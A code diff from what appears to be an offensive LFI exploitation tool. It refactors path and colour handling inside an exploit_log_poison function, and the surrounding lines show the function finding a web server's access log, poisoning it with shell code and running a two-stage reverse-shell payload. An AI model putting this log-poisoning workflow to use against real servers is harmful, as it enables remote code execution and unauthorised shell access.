@@ -5,7 +5,6 @@ import threading
 from src.utils.arguments import init_args
 from src.httpreqs import request
 from src.configs import config
-from src.utils.args_check import scriptDirectory
 from src.utils import colors
 from src.utils.info import printFancyString
 from src.utils.info import printInfo
@@ -23,12 +22,12 @@ def exploit_log_poison(
     lastPrintedStringLen = 0
 
     if not os.path.exists(
-        scriptDirectory + os.sep + "src/wordlists/http_access_log.txt"
+        args['scriptDirectory'] + os.sep + "src/wordlists/http_access_log.txt"
     ):
         print(
-            colors.red("[-]")
+            colors.Colors().red("[-]")
             + " Cannot locate '"
-            + scriptDirectory
+            + args['scriptDirectory']
             + os.sep
             + "src/wordlists/http_access_log.txt"
             + "' file that contains log locations",
@@ -36,9 +35,9 @@ def exploit_log_poison(
         )
         return
 
-    with open(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt", "r", encoding="latin1") as f:
+    with open(args['scriptDirectory'] + os.sep + "src/wordlists/http_access_log.txt", "r", encoding="latin1") as f:
         print(
-            colors.green("[i]")
+            colors.Colors().green("[i]")
             + " Enumerating file system to discover access log location...", flush = True
         )
         lines = f.readlines()
@@ -74,7 +73,7 @@ def exploit_log_poison(
                 lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
                 print(
                     "\n"
-                    + colors.green("[.]")
+                    + colors.Colors().green("[.]")
                     + " Located canary in target's access log at '"
                     + line
                     + "'",
@@ -82,7 +81,7 @@ def exploit_log_poison(
                 )
 
                 print(
-                    colors.green("[.]")
+                    colors.Colors().green("[.]")
                     + " Poisoning access log with the shell code... ",
                     flush = True
                 )
@@ -154,7 +153,7 @@ def exploit_log_poison(
 
                     if config.tempArg in post:
                         print(
-                            colors.green("[.]")
+                            colors.Colors().green("[.]")
                             + " Executing stage 1 of the revshell payload...",
                             flush = True
                         )
@@ -170,7 +169,7 @@ def exploit_log_poison(
 
                         if payloadStageTwo != "":
                             print(
-                                colors.green("[.]")
+                                colors.Colors().green("[.]")
                                 + " Executing stage 2 of the revshell payload...",
                                 flush = True
                             )
@@ -191,7 +190,7 @@ def exploit_log_poison(
                             url.replace(config.tempArg, line) + "&c=" + payloadStageOne
                         )
                         print(
-                            colors.green("[.]")
+                            colors.Colors().green("[.]")
                             + " Executing stage 1 of the revshell payload...",
                             flush = True
                         )
@@ -212,7 +211,7 @@ def exploit_log_poison(
                                 + payloadStageTwo
                             )
                             print(
-                                colors.green("[.]")
+                                colors.Colors().green("[.]")
                                 + " Executing stage 2 of the revshell payload. Check your listener...",
                                 flush = True
                             )
@@ -234,7 +233,7 @@ def exploit_log_poison(
             # lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
             if args['verbose']:
                 printFancyString(
-                    colors.red("[-]")
+                    colors.Colors().red("[-]")
                     + " Couldn't locate target server's access log to poison/log is not readable.\n",
                     lastPrintedStringLen,
                 )
